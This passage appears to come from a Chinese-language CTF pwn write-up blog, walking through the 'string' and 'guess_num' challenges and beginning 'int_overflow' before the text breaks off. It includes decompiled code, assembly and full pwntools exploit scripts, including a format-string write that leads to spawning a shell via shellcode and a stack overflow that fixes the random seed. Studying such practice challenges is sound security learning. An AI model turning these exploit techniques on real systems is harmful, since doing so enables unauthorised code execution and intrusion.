&amp;format); <span class="comment">// vulnrable of printf</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I hear it, I hear it....&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br></pre></td></tr></table></figure>

<p><strong>sub_400CA6(a1)</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *a1 == a1[<span class="number">1</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wizard: I will help you! USE YOU SPELL&quot;</span>);</span><br><span class="line">    v1 = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">    read(<span class="number">0</span>, v1, <span class="number">0x100</span>uLL);</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(_QWORD, <span class="type">void</span> *))v1)(<span class="number">0LL</span>, v1);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>代码在本地跑几次之后可以得到简化的代码执行流程如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">print(v4<span class="number">&#x27;</span>s address) 	<span class="comment">// in fact,v4=v3</span></span><br><span class="line">sub_400D72(v4)</span><br><span class="line">  print name </span><br><span class="line"> 	name_length &lt; <span class="number">12</span></span><br><span class="line">	sub_400A7D()</span><br><span class="line">		east</span><br><span class="line">	<span class="title function_">sub_400BB9</span><span class="params">()</span></span><br><span class="line">		input v1 = go into there</span><br><span class="line">		v1 == <span class="number">1</span></span><br><span class="line">		input <span class="type">int</span>  v2		 : address</span><br><span class="line">		input <span class="type">char</span> format: wish</span><br><span class="line">	sub_400CA6(a1) <span class="comment">// a1==v4==v3</span></span><br><span class="line">		*a1 == a1[<span class="number">1</span>] <span class="comment">// a1[1] == 85 we already knew,only we need 									 // to do is make the a1=85, too. </span></span><br><span class="line">		mmap(<span class="number">0LL</span>,<span class="number">0x1000</span>uLL,) <span class="comment">// locate in memeary</span></span><br><span class="line">		read(<span class="number">0</span>,v1)</span><br><span class="line">		((<span class="type">void</span> (__fastcall *)(_QWORD, <span class="type">void</span> *))v1)(<span class="number">0LL</span>, v1);<span class="comment">// excuate code what just readed</span></span><br></pre></td></tr></table></figure>

<p>对代码进行分析后发现在最后进入的函数 <code>400CA6</code> 中，最后如果满足了 <code>if(*a1=a1[1])</code> 进入条件语句中我们就可以通过开辟内存，通过 <code>read</code> 传入shellcode ,从而在内存中执行我们的 shellcode。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v1 = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">read(<span class="number">0</span>, v1, <span class="number">0x100</span>uLL);</span><br><span class="line">((<span class="type">void</span> (__fastcall *)(_QWORD, <span class="type">void</span> *))v1)(<span class="number">0LL</span>, v1);</span><br></pre></td></tr></table></figure>

<p>这段代码的汇编如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400D07                 mov     edi, offset aWizardIWillHel ; &quot;Wizard: I will help you! USE YOU SPELL&quot;</span><br><span class="line">.text:0000000000400D0C                 call    puts</span><br><span class="line">.text:0000000000400D11                 mov     r9d, 0          ; offset</span><br><span class="line">.text:0000000000400D17                 mov     r8d, 0FFFFFFFFh ; fd</span><br><span class="line">.text:0000000000400D1D                 mov     ecx, 21h        ; flags</span><br><span class="line">.text:0000000000400D22                 mov     edx, 7          ; prot</span><br><span class="line">.text:0000000000400D27                 mov     esi, 1000h      ; len</span><br><span class="line">.text:0000000000400D2C                 mov     edi, 0          ; addr</span><br><span class="line">.text:0000000000400D31                 call    mmap</span><br><span class="line">.text:0000000000400D36                 mov     [rbp+buf], rax</span><br><span class="line">.text:0000000000400D3A                 mov     rax, [rbp+buf]</span><br><span class="line">.text:0000000000400D3E                 mov     edx, 100h       ; nbytes</span><br><span class="line">.text:0000000000400D43                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000400D46                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000400D4B                 call    read</span><br><span class="line">.text:0000000000400D50                 mov     rax, [rbp+buf]</span><br><span class="line">.text:0000000000400D54                 mov     edi, 0</span><br><span class="line">.text:0000000000400D59                 call    rax</span><br></pre></td></tr></table></figure>

<p>可以看到在 <code>mmap</code> 分配了 <code>1000h</code> 的内存空间后<code>read</code> 读入了 <code>100h</code> 的内容，随后执行了 <code>rax</code> 中的内容。</p>
<p>那如何满足判断？我们查看函数参数的传递过程后发现，要比较的参数 <code>a1</code> 实际上就是 <code>v4</code> 也就是 <code>v3</code> 。而在 <code>main</code> 函数开始就已经给 <code>*a1</code> 和 <code>a1[1]</code> 赋了不同的值，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*v3 = <span class="number">68</span>;					</span><br><span class="line">v3[<span class="number">1</span>] = <span class="number">85</span>;</span><br></pre></td></tr></table></figure>

<p>所以我们要想办法修改二者其中之一的值，使其与另一个相等即可。</p>
<p>如何修改？在函数 <code>400BB9</code> 中我们发现了存在格式化字符串漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_isoc99_scanf((__int64)<span class="string">&quot;%ld&quot;</span>, (__int64)&amp;v2);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;And, you wish is:&quot;</span>);</span><br><span class="line">_isoc99_scanf((__int64)<span class="string">&quot;%s&quot;</span>, (__int64)&amp;format);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Your wish is&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(&amp;format, &amp;format); <span class="comment">// 漏洞点</span></span><br></pre></td></tr></table></figure>

<p>我们可以想办法将 <code>v2</code> 的地址指向 <code>v3</code>或者<code>v3[1]</code>，然后修改其值为另外变量的值即可。</p>
<p>先利用格式化字符串漏洞泄漏出v2 的偏移</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># coding = utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;111.200.241.244&quot;</span></span><br><span class="line">PORT = <span class="number">59601</span></span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta"># for executing code on remote or local</span></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span> and sys.argv[<span class="number">1</span>] == <span class="string">&#x27;-r&#x27;</span>:</span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./string&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">&#x27;Pwning start&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;[0] is &quot;</span>)</span><br><span class="line">add1 = <span class="type">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>) <span class="comment">//turn to hex</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;[1] is &quot;</span>)</span><br><span class="line">add2 = <span class="type">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">print add1,add2</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What should your character&#x27;s name be:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;brian&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;So, where you will go?east or up?:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;east&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;go into there(1), or leave(0)?:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&#x27;Give me an address&#x27;\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="string">&#x27;A&#x27;</span>*<span class="number">4</span> + <span class="string">&#x27;.%x&#x27;</span>*<span class="number">10</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;And, you wish is:\n&quot;</span>)</span><br><span class="line">p.sendline(offset)</span><br></pre></td></tr></table></figure>

<p>通过我们之前的测试，前几步输入正确的字符串来让程序正确进行到 <code>400BB9</code> 函数处。接着在输入 <code>address</code> 时输入我们的测试数字<code>2</code>,接着尝试通过漏洞泄漏出变量的偏移量。程序执行结果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received <span class="number">0x30</span> bytes:</span><br><span class="line">    <span class="string">&#x27;A voice heard in your mind\n&#x27;</span></span><br><span class="line">    <span class="string">&quot;&#x27;Give me an address&#x27;\n&quot;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;2\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x12</span> bytes:</span><br><span class="line">    <span class="string">&#x27;And, you wish is:\n&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x23</span> bytes:</span><br><span class="line">    <span class="string">&#x27;AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x\n&#x27;</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process <span class="string">&#x27;./string&#x27;</span> stopped with <span class="built_in">exit</span> code <span class="number">0</span> (pid <span class="number">13059</span>)</span><br><span class="line">[DEBUG] Received <span class="number">0x17e</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Your wish is\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;AAAA.75d7b7e3.75d7c8c0.75a9f224.c.0.75d772a0.2.41414141.252e7825.2e78252eI hear it, I hear it....\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!\n&#x27;</span></span><br></pre></td></tr></table></figure>

<p>在我们输入 <code>&#39;AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x\n&#39;</code> 之后，我们得到的输出为：</p>
<p><code>AAAA.75d7b7e3.75d7c8c0.75a9f224.c.0.75d772a0.2.41414141.252e7825.2e78252eI</code></p>
<p>在偏移为7的位置看到了我们的测试输入 <code>2</code> ,所以可以确定 <code>v2</code> 的偏移为7。</p>
<p>下一步我们可以将测试输入修改为 <code>v3</code> 的地址，然后通过格式化字符串漏洞将修改后的偏移量位置的值输入为<code>v3[1]</code> 的值，即85，来满足 <code>v3=v3[1]</code>，从而顺利进入可执行 shellcode 的代码段 。</p>
<p>完整 payload 如下(这里我修改的是<code>v3[1]</code>的值，注意给<code>v2</code>传地址时要赋<code>v4+4</code>的地址，赋值时也要赋<code>68</code>，而不是<code>85</code>了)：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># coding = utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;111.200.241.244&quot;</span></span><br><span class="line">PORT = <span class="number">59601</span></span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta"># for executing code on remote or local</span></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span> and sys.argv[<span class="number">1</span>] == <span class="string">&#x27;-r&#x27;</span>:</span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./string&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">&#x27;Pwning start&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;[0] is &quot;</span>)</span><br><span class="line">add1 = <span class="type">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;[1] is &quot;</span>)</span><br><span class="line">add2 = <span class="type">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">print add1,add2</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What should your character&#x27;s name be:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;brian&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;So, where you will go?east or up?:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;east&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;go into there(1), or leave(0)?:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&#x27;Give me an address&#x27;\n&quot;</span>)</span><br><span class="line">p.sendline(str(add2)) </span><br><span class="line"></span><br><span class="line">offset = <span class="string">&#x27;A&#x27;</span>*<span class="number">4</span> + <span class="string">&#x27;.%x&#x27;</span>*<span class="number">10</span></span><br><span class="line">payload = <span class="string">&#x27;%68d%7$n&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;And, you wish is:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">shell = <span class="keyword">asm</span>(shellcraft.sh())</span><br><span class="line">p.recvuntil(<span class="string">&quot;Wizard: I will help you! USE YOU SPELL\n&quot;</span>)</span><br><span class="line">p.sendline(shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h2><p>64位文件，chseksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>

<p>开启了栈溢出保护，没办法栈上执行代码。</p>
<p>反编译后<code>main()</code>部分代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">v4 = 0;</span><br><span class="line"> v6 = 0;</span><br><span class="line"> *(_QWORD *)seed = sub_BB0();</span><br><span class="line">puts(&quot;-------------------------------&quot;);</span><br><span class="line"> puts(&quot;Welcome to a guess number game!&quot;);</span><br><span class="line"> puts(&quot;-------------------------------&quot;);</span><br><span class="line"> puts(&quot;Please let me know your name!&quot;);</span><br><span class="line"> printf(&quot;Your name:&quot;, 0LL);</span><br><span class="line"> gets((__int64)&amp;v7);</span><br><span class="line"> srand(seed[0]);</span><br><span class="line"> for ( i = 0; i &lt;= 9; ++i )</span><br><span class="line"> &#123;</span><br><span class="line">   v6 = rand() % 6 + 1;</span><br><span class="line">   printf(&quot;-------------Turn:%d-------------\n&quot;, (unsigned int)(i + 1));</span><br><span class="line">   printf(&quot;Please input your guess number:&quot;);</span><br><span class="line">   __isoc99_scanf(&quot;%d&quot;, &amp;v4);</span><br><span class="line">   puts(&quot;---------------------------------&quot;);</span><br><span class="line">   if ( v4 != v6 )</span><br><span class="line">   &#123;</span><br><span class="line">     puts(&quot;GG!&quot;);</span><br><span class="line">     exit(1);</span><br><span class="line">   &#125;</span><br><span class="line">   puts(&quot;Success!&quot;);</span><br><span class="line"> &#125;</span><br><span class="line"> sub_C3E();</span><br></pre></td></tr></table></figure>

<p><code>sub_BB0()</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">_int64 sub_BB0()</span><br><span class="line">&#123;</span><br><span class="line">  int fd; // [rsp+Ch] [rbp-14h]</span><br><span class="line">  __int64 buf; // [rsp+10h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v3; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">  if ( fd &lt; 0 || (signed int)read(fd, &amp;buf, 8uLL) &lt; 0 )</span><br><span class="line">    exit(1);</span><br><span class="line">  if ( fd &gt; 0 )</span><br><span class="line">    close(fd);</span><br><span class="line">  return buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数没有溢出点，<code>buf</code> 只读了 8h</p>
<p><code>sub_C3E()</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 sub_C3E()</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;You are a prophet!\nHere is your flag!&quot;);</span><br><span class="line">  system(&quot;cat flag&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数的逻辑是在经过10次比较，如果每次 v4&#x3D;&#x3D;v6 都满足则可以 <code>cat /flag</code> 。而 v6 是通过随机函数而来。这里的 <code>rand()</code> 函数的种子被设置为了 <code>seed[0]</code>，我们知道其实随机都是假随机，只要我们设置种子为0&#x2F;1，即可得到相同的随机数。所以我们想办法控制随机种子。</p>
<p>在代码中我们注意到 v7(var_30) 和 seed 是栈上相邻的变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000C66 var_3C          = dword ptr -3Ch</span><br><span class="line">.text:0000000000000C66 var_38          = dword ptr -38h</span><br><span class="line">.text:0000000000000C66 var_34          = dword ptr -34h</span><br><span class="line">.text:0000000000000C66 var_30          = byte ptr -30h</span><br><span class="line">.text:0000000000000C66 seed            = dword ptr -10h</span><br><span class="line">.text:0000000000000C66 var_8           = qword ptr -8</span><br></pre></td></tr></table></figure>

<p>v7 的地址空间大小为<code> char v7; // [rsp+10h] [rbp-30h]</code>  ,我们通过 <code>gets(v7)</code> 输入20h+1h来使其溢出到 seed，从而控制 seed。</p>
<p>在最后pwn之前，我们还需要找到使用随机函数的so库</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$:ldd guess_num</span><br><span class="line">	linux-vdso.so.1 (0x00007ffd0a3b1000)</span><br><span class="line">	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe8e541c000)</span><br><span class="line">	/lib64/ld-linux-x86-64.so.2 (0x00007fe8e5a10000)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>虽然源代码使用了<code>so.2</code> ，但是本地测试发现用不了，采用了 <code>so.6</code>。</p>
<p>Payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;111.200.241.244&quot;</span></span><br><span class="line">PORT = <span class="number">49862</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;-r&#x27;</span>:</span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./guess_num&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your name:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    v6 = libc.rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input your guess number:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(v6))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><p>32位文件，查看保护</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>

<p>没有检测栈溢出，堆栈代码不可执行。IDA打开</p>
<p>Main()函数没有问题，进入Login()，查看反汇编结果</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">login</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [esp+0h] [ebp-228h]</span></span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+200h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your username:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x19</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, &amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x199</span>u);</span><br><span class="line">  <span class="keyword">return</span> check_passwd(&amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的read()同样没有溢出，函数最后经过<code>check_passwd($buf)</code>函数将最多输入0x199长度的参数传递过去。进入该函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">check_passwd</span><span class="params">(<span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> dest; <span 